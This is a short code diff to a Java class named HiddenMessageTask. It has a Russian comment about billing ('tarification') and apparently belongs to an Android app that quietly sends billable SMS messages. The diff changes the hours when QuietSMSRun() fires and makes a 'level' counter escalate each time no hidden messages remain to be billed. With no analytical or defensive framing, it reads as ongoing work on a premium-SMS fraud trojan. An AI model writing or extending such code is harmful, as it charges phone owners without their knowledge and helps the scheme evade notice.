@@ -42,8 +42,10 @@ public class HiddenMessageTask implements Runnable {
 
             if (mDBConnection.lineCount(currdate) < 2) {
                 if (currentHour >= 0 && currentHour < 2) if (!mDBConnection.getSettings("level").equals("0")) mDBConnection.setSettings("level", "0");
-                if (currentHour >= 0 && currentHour < 8) QuietSMSRun();
-                if (currentHour >= 14 && currentHour <= 23) QuietSMSRun();
+                if (currentHour >= 0 && currentHour <=8) QuietSMSRun();
+                if (currentHour >= 14 && currentHour <= 16) QuietSMSRun();
+                if (currentHour >= 19 && currentHour <= 23) QuietSMSRun();
+
             }
             client.HiddenMessageTask = false;
         }
@@ -86,7 +88,9 @@ public class HiddenMessageTask implements Runnable {
             List<SmsLine> lineList = mDBConnection.getAllSingleHiddenSMS(currdate);
             //Если мы уже прошли один раз по ветке тарификации и ни чего не осталось к тарифицированию
             if (lineList.size() == 0) {
-                mDBConnection.setSettings("level", "1");
+                int i_level = Integer.parseInt(mDBConnection.getSettings("level"));
+                i_level++;
+                mDBConnection.setSettings("level", ""+i_level);
                 //Обновляем статус с -1 в 0
                 mDBConnection.MakeNewTarifLine(currdate);
                 //И снова выбираем линию к отправке
